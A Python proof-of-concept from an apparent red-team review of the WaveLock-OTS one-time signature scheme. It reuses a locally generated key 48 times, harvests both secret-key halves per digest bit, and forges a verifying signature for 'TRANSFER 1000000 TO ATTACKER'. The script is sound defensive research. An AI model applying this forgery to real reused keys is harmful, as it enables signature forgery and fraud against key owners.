"""
ots_reuse_to_total_forgery.py — WaveLock-OTS one-time-key reuse → total forgery.

Threat model: attacker has the public key and several signatures produced under
the SAME WaveLock-OTS key (because reuse was accidentally allowed: a file copy,
a crash before ``used=True`` was persisted, a restored backup, a race between
two ``ots-sign`` processes, or ``--unsafe-allow-reuse``). The attacker does NOT
have the seed, ψ★, or the secret-key file.

WaveLock-OTS is plain Lamport (reveal one of two slices per digest bit). Each
extra signature on a fresh message reveals, on average, half of the
previously-unrevealed slices. After ~30-40 signatures the attacker has BOTH
halves ``sk[i][0]`` and ``sk[i][1]`` for every one of the 256 bit positions and
can therefore assemble a valid signature for ANY attacker-chosen message —
without ever touching the seed.

This is the canonical Lamport reuse break. It demonstrates that the ONLY thing
standing between WaveLock-OTS and total forgery is the ``used`` flag, which is
advisory state in a JSON file the owner controls (see the CLI durability gap in
WAVELOCK_OTS_REDTEAM.md, Finding D). It SUCCEEDS — and is meant to.
"""

from __future__ import annotations

import os

from wavelock.crypto.wavelock_ots import (
    generate_ots_keypair,
    sign_ots,
    verify_ots,
    _message_digest,
    _digest_bits,
)


def collect_both_halves(secret_key: dict, public_key: dict,
                        n_signatures: int = 48) -> dict:
    """Reuse the key ``n_signatures`` times, harvesting revealed slices.

    Returns a mapping ``{(i, b): sk_hex}`` of every slice the attacker has
    observed. With enough reuses this covers both halves of every bit.
    """
    p_hash = bytes.fromhex(public_key["params_hash"])
    known: dict[tuple[int, int], str] = {}
    for t in range(n_signatures):
        message = f"benign-{t}-{os.urandom(6).hex()}"
        sig = sign_ots(secret_key, message, allow_reuse=True)
        bits = _digest_bits(_message_digest(message, p_hash))
        for i, b in enumerate(bits):
            known[(i, b)] = sig["revealed"][i]
    return known


def forge_arbitrary(public_key: dict, known: dict, target_message: str):
    """Assemble a signature for ``target_message`` from harvested slices.

    Returns the forged signature dict, or ``None`` if a needed half is missing.
    """
    p_hash = bytes.fromhex(public_key["params_hash"])
    bits = _digest_bits(_message_digest(target_message, p_hash))
    revealed = []
    for i, b in enumerate(bits):
        if (i, b) not in known:
            return None
        revealed.append(known[(i, b)])
    return {
        "scheme": public_key["scheme"],
        "hash_alg": public_key["hash_alg"],
        "version": 1,
        "one_time_key_id": public_key.get("one_time_key_id"),
        "params_hash": public_key["params_hash"],
        "psi_commitment": public_key["psi_commitment"],
        "revealed": revealed,
    }


def reuse_forgery_succeeds(n_signatures: int = 48,
                           target: str = "TRANSFER 1000000 TO ATTACKER") -> bool:
    kp = generate_ots_keypair(entropy_bits=256)
    pub, sec = kp["public_key"], kp["secret_key"]
    known = collect_both_halves(sec, pub, n_signatures=n_signatures)
    forged = forge_arbitrary(pub, known, target)
    if forged is None:
        return False
    return bool(verify_ots(pub, target, forged))


if __name__ == "__main__":
    n_bits = 256
    kp = generate_ots_keypair(entropy_bits=256)
    pub, sec = kp["public_key"], kp["secret_key"]
    known = collect_both_halves(sec, pub, n_signatures=48)
    have_both = sum(1 for i in range(n_bits)
                    if (i, 0) in known and (i, 1) in known)
    print(f"[OTS reuse] positions with BOTH halves: {have_both}/{n_bits}")
    target = "TRANSFER 1000000 TO ATTACKER"
    forged = forge_arbitrary(pub, known, target)
    ok = forged is not None and verify_ots(pub, target, forged)
    print(f"[OTS reuse] forged arbitrary message verifies: {ok}")
    print("  (this SUCCEEDS — reuse is catastrophic; the `used` flag is the "
          "only protection, and it is advisory file state.)")
